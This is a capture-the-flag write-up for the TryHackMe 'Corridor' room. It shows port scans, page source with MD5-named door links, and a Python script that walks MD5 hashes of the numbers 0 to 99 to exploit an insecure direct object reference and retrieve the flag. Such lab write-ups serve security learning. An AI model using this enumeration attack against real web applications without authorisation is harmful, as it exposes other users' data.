---
title: TryHackMe Corridor -- Writeup
date: 2022-10-10
categories: [TryHackMe, Easy]
tags: [idor, mis-config, linux]     # TAG names should always be lowercase
---

# Setup 
Always make sure to connect openvpn with the following command:

```bash
sudo openvpn --config <file.ovpn>
```
The next step is exporting the ip address of the machine. This is done by running the following command:

```bash
export ip=10.10.80.228
```

After connecting to vpn, run a ping command to make sure you are connected to the vpn.

```bash
ping -c 4 $ip
```

# Enumeration

I always use rustscan to enumerate the ports (rustscan is faster than nmap)

## Rustscan Output

```bash
rustscan -a $ip

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

```

From the output, we can see that port 80 is open. Let's check it out with nmap.

## Nmap

```bash
nmap -sCV -oN nmap/initial $ip

# Nmap 7.92 scan initiated Tue Oct 11 19:44:16 2022 as: nmap -sCV -oN nmap 10.10.80.228
Nmap scan report for 10.10.80.228
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
|_http-server-header: Werkzeug/2.0.3 Python/3.10.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 11 19:45:03 2022 -- 1 IP address (1 host up) scanned in 47.20 seconds

```
As u can see, Werkzeug is running on port 80. Let's check it out.
At first i thought its gonna be werkzeug console vulnerability, but it was not.

Navigating to the website, we got an a pic of doors and nothing else. Viewing the source code reveals something interesting
    
```html
<map name="image-map">
        <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" title="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
        <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" title="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
        <area target="" alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" title="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3" coords="585,698,598,691,593,429,584,421" shape="poly">
        <area target="" alt="a87ff679a2f3e71d9181a67b7542122c" title="a87ff679a2f3e71d9181a67b7542122c" href="a87ff679a2f3e71d9181a67b7542122c" coords="650,658,644,437,658,652,655,437" shape="poly">
        <area target="" alt="e4da3b7fbbce2345d7772b0674a318d5" title="e4da3b7fbbce2345d7772b0674a318d5" href="e4da3b7fbbce2345d7772b0674a318d5" coords="692,637,690,455,695,628,695,467" shape="poly">
        <area target="" alt="1679091c5a880faf6fb5e6087eb1b2dc" title="1679091c5a880faf6fb5e6087eb1b2dc" href="1679091c5a880faf6fb5e6087eb1b2dc" coords="719,620,719,458,728,471,728,609" shape="poly">
        <area target="" alt="8f14e45fceea167a5a36dedd4bea2543" title="8f14e45fceea167a5a36dedd4bea2543" href="8f14e45fceea167a5a36dedd4bea2543" coords="857,612,933,610,936,456,852,455" shape="poly">
        <area target="" alt="c9f0f895fb98ab9159f51fd0297e236d" title="c9f0f895fb98ab9159f51fd0297e236d" href="c9f0f895fb98ab9159f51fd0297e236d" coords="1475,857,1473,354,1537,335,1541,901" shape="poly">
        <area target="" alt="45c48cce2e2d7fbdea1afc51c7c6ad26" title="45c48cce2e2d7fbdea1afc51c7c6ad26" href="45c48cce2e2d7fbdea1afc51c7c6ad26" coords="1324,766,1300,752,1303,401,1325,397" shape="poly">
        <area target="" alt="d3d9446802a44259755d38e6d163e820" title="d3d9446802a44259755d38e6d163e820" href="d3d9446802a44259755d38e6d163e820" coords="1202,695,1217,704,1222,423,1203,423" shape="poly">
        <area target="" alt="6512bd43d9caa6e02c990b0a82652dca" title="6512bd43d9caa6e02c990b0a82652dca" href="6512bd43d9caa6e02c990b0a82652dca" coords="1154,668,1146,661,1144,442,1157,442" shape="poly">
        <area target="" alt="c20ad4d76fe97759aa27a0c99bff6710" title="c20ad4d76fe97759aa27a0c99bff6710" href="c20ad4d76fe97759aa27a0c99bff6710" coords="1105,628,1116,633,1113,447,1102,447" shape="poly">
        <area target="" alt="c51ce410c124a10e0db5e4b97fc2af39" title="c51ce410c124a10e0db5e4b97fc2af39" href="c51ce410c124a10e0db5e4b97fc2af39" coords="1073,609,1081,620,1082,459,1073,463" shape="poly">
    </map>
```

This hashes looks like md5, so i decided to use burp to look into the request a little more.
My next step was trying to encrypt 'console' with md5sum using the following command

```bash
echo -n "console" | md5sum
```
Navigating the page rusulted in a 404 error (I actually got stuck in here for a while). After reading the challenge description again i realized that most probably the way to get the flag is by generating a wordlist, the convert everything in the wordlist to md5 and then try to navigate to the page. 

# Solve Script

After noticing the flow of the application, i decided to create a script to automate the process of solving the challenge. 

```python

#!/usr/bin/env python3


import urllib.request as req
import hashlib as hs
import re
import logging

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)

ip, port = "10.10.118.84", 80


for i in range(0, 100):
    logging.info("Solve script by <abuyusif01>")
    logging.info("Trying %d", i)
    hash_value = hs.md5(str.encode(str(i))).hexdigest()
    # print(hash_value) sanity check

    output = req.urlopen(f"http://{ip}:{port}/{hash_value}").read()

    if re.search(b"flag", output):

        flag = (output.split(b"flag{")[1].split(b"}")[0].decode().strip().replace(" ", "")) # some string manipulation magic
        logging.info("flag found at index: %d", i)
        logging.info("flag hash is: %s", flag)
        logging.info("flag with tags: "+"flag{" + flag + "}")
        logging.info("saving flag to a flag.txt file")

        with open("flag.txt", "w") as f:
            f.write("flag{" + flag + "}\n")
            logging.info("flag saved to flag.txt")
        break

```
# Flag

``` txt
flag{2477ef************0a6b8862e}
```

Thanks for reading, and i hope this helps :)